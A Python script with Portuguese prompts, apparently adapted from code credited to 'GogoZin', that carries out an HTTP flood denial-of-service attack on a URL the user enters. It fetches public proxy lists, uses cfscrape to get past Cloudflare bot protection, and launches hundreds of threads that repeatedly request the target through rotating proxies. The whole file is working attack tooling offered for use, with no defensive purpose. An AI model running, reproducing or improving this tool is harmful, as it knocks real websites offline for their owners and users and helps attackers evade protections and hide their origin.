import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore

print("\n\nLuiz1n a lenda")

def opth():
	for a in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads " + str(a+1) + "Criadas")
	input("Pressione enter para atacar! : ")
	global oo
	oo = True

oo = False
def main():
	global url
	global list
	global pprr
	global thr
	global per
	url = str(input("Url : " ))
	ssl = str(input("Ativar modo SSL? ? (y/n) : "))
	ge = str(input("Pegar nova lista de proxy ? (y/n) : "))
	if ge =='y':
		if ssl == 'y':
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000') #Code By GogoZin
			with open('proxies.txt','wb') as fp:
				fp.write(rsp.content)
				print("Sucesso ao obter nova lista de proxy HTTPS !")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000') #Code By GogoZin
			with open('proxies.txt','wb') as fp:
				fp.write(rsp.content)
				print("Sucesso ao obter nova lista de proxy HTTP !")
	else:
		pass
	list = str(input("Lista de proxy : Ex(proxies.txt) : "))
	pprr = open(list).readlines()
	print("Contador de proxy : "," %d" %len(pprr))
	thr = int(input("Threads (1-400 - Normal é > 300) : "))
	per = int(input("CC.Power (1-100 - Normal é >  70) : "))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cfscrape.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(5)
	while True:
		while oo:
			try:
				s.get(url)
				print("Atacando -> " + str(url),"From~# ",str(proxy[0])+":"+str(proxy[1]))
				try:
					for g in range(per):
						s.get(url)
						print("Atacando -> " + str(url)+ " From~# " + str(proxy[0])+":"+str(proxy[1]))
					s.close()
				except:
					s.close()
			except:
				s.close()
				print("Não foi possível conectar as proxys ou a url. !")


if __name__ == "__main__":
	main()